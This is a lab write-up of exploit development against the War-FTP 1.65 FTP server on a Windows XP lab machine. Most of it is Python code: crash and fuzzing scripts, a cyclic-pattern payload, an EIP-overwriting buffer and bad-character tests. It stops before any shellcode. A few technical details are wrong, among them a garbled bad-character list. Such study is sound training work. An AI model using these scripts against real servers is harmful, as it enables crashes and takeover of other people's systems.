# Lab Machine Write up and Notes 

## Resources: 

Original Exploit: https://www.exploit-db.com/exploits/3570


### Nmap of the XP Machine

<img src="/images/nmap-xp-machine-tcp.png" >

A quick Nmap scan of the target machines reveals TCP port 21 open. I also outputted to all formats 
so I can import it into searchsploit to see if it catches some stuff. 

###  SearchSploit Results

I imported the Nmap scan like so: 

``
searchsploit --nmap xp-machine-tcp.xml 
``

But output was too verbose so I did not put it here and instead re-ran the command manually 

<img src="/images/searchsploit-1.png" >


###  Metasploit Console Exploit

<img src="/images/msfconsole.png" >

As you can see, the exploit did not work ( This is because it just crashed the application so, we are going to remake this manually )


### I Attached The Program to Immunity Debugger 

<img src="/images/immunity-ftp.png" width=812px height=474px>


#### Vulnerability Discovery Inside The Application 

## Manual 

#### Python One Liner To Find Crashing Point Manually

This prints 1,000 As for ease of access 

<img src="/images/python-oneliner.png">

#### In the case of trying this directly through a FTP Client on a modern Distrobution the Client will stop you from sending the max buffer 

<img src="/images/failed-exploit.png">

#### So we are going to try with NetCat and See if that works better 

<img src="/images/crash-succeeded.png">

#### As you can see we crashed the program ( I did have to enter a pass before it crashed ) and to confirm the crash opened our debugger 

<img src="/images/immunity-crash.png" width=812px height=474px>

#### YAAAY we have control over the EIP and have written over it with our A's 

<img src="/images/immunity-EIP.png">

#### I have created an Exploit that will crash the server! 

This is a skeleton exploit we will add on more stuff as we find it

```python3
#!/usr/bin/python3

## War-FTP 1.65 Exploit

import socket
from urllib import response 

# define the variables to be sent to the server
ip = '192.168.164.170'
port = 21
buffer = b"A" * 510
payload = ""

# create the socket to connect to the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))
# because there is a banner we wanna print it out 
response = s.recv(1024)
print(response)

# sending the exploit 
s.send(b"USER " + buffer + b"\r\n")
response = s.recv(1024)
print(response)

# because you have to enter the pass as well 
s.send(b"PASS PARROTASSASSIN15\r\n")
s.close()

```

## Automation 

#### We need to find the exact crash point so we make a fuzzing script to narrow it down after manual or automate it from the beginning 


```python3
#!/usr/bin/python3

import socket
from time import sleep
from urllib import response 

buffer = b"B" * 10
x = 0

while True: 
    buff = (b"A" * x ) + buffer
    print("Fuzzing " + str(len(buff)))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(('192.168.164.170', 21))
    response = s.recv(1024)
    print(response)
    s.send(b"USER " + buff + b"\r\n")
    response = s.recv(1024)
    s.send(b"PASS PARROTASSASSIN15\r\n")
    s.close
    x = x + 100
    sleep(2)
```

#### We find that it crashes at 510 as the server no longer responds after 

<img src="/images/python3-crash.png" width=300px height=200px>


#### Let's find how big we can go with the buffer space 

By slowly incrementing the value of the buffers being sent you can look for a new crash, something to break etc 
the bigger the crash the more you can do and the easier it is to exploit it 

#### It seems we can only send 1100 bytes at a time! 

as seen here: 

<img src="/images/broken-progam.png">


#### We now need to determine the offset 
``
msf-pattern_create -l 1100
``

<img src="/images/pattern-create.png">

#### Send off these bytes to the server with this exploit

```python3
#!/usr/bin/python3

## War-FTP 1.65 Exploit

import socket
from urllib import response 

# define the variables to be sent to the server
ip = '192.168.164.170'
port = 21
buffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk"
payload = ""

# create the socket to connect to the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))
# because there is a banner we wanna print it out 
response = s.recv(1024)
print(response)

# sending the exploit 
s.send(b"USER " + buffer + b"\r\n")
response = s.recv(1024)
print(response)

# because you have to enter the pass as well 
s.send(b"PASS parrot\r\n")
s.close()
```

#### If we take a look at immunity we now see that the EIP is different 

<img src="/images/immunity-offset.png">

so we will enter: 

``
msf-pattern_offset -l 1100 -q 32714131
``

And we should get the following: 

<img src="/images/pattern-offset.png">


#### Now that we know the offset it 485 we will add that into our exploit 

```python3
#!/usr/bin/python3

## War-FTP 1.65 Exploit

import socket
from urllib import response 

# define the variables to be sent to the server
ip = '192.168.164.170'
port = 21
payload = ""
buffer = b"A" * 485 + b"B" * 4 + b"C" * (1100 - 485 - 4)

# create the socket to connect to the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))
# because there is a banner we wanna print it out 
response = s.recv(1024)
print(response)

# sending the exploit 
s.send(b"USER " + buffer + b"\r\n")
response = s.recv(1024)
print(response)

# because you have to enter the pass as well 
s.send(b"PASS parrot\r\n")
s.close()
```

#### Since we now know we can control the Cs as seen below we need the Bs to be a memory address so we can sent it to a place where we control aka the Cs

<img src="/images/debugger.png">


#### Finding Bad Chars

We can generate a list of hex chars from 0x00000000 - 0xffffffff with this python3 script

```python3
#!/usr/bin/python3

import sys

# 0 - 256 is 0x00000000 - 0xffffffff
for i in range(0,256):
    sys.stdout.write("\\x" + '{:02x}'.format(i))
```
We should see an output like this: 

```
\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

By default "\x00" is going to be a bad char this is because "\x00" terminates the function 

Lets remove that, send the exploit, and then see what else is an issue when it makes it into memory 

Updated Exploit: 

```python3
#!/usr/bin/python3

## War-FTP 1.65 Exploit

import socket
from urllib import response 

# define the variables to be sent to the server
ip = '192.168.164.170'
port = 21
badsend = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
buffer = b"A" * 485 + b"B" * 4 + b"C" * (1100 - 485 - 4 - len(badsend)) + badsend

# create the socket to connect to the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))
# because there is a banner we wanna print it out 
response = s.recv(1024)
print(response)

# sending the exploit 
s.send(b"USER " + buffer + b"\r\n")
response = s.recv(1024)
print(response)

# because you have to enter the pass as well 
s.send(b"PASS parrot\r\n")
s.close()

```

### Bad Char Dump
<img src="/images/badchar-dump.png">


There are two 20s in this dump this is the numerical value of \x0a this will need to be removed ( this is an issue because we are sending through FTP and that is a new line char

badchars
* \x0a
* \x40
* \x


We could waste our time with looking for JMP addresses manually or we can use mona modules 

``
!mona jmp -r esp 
``

<img src="/images/mona-jmp.png">
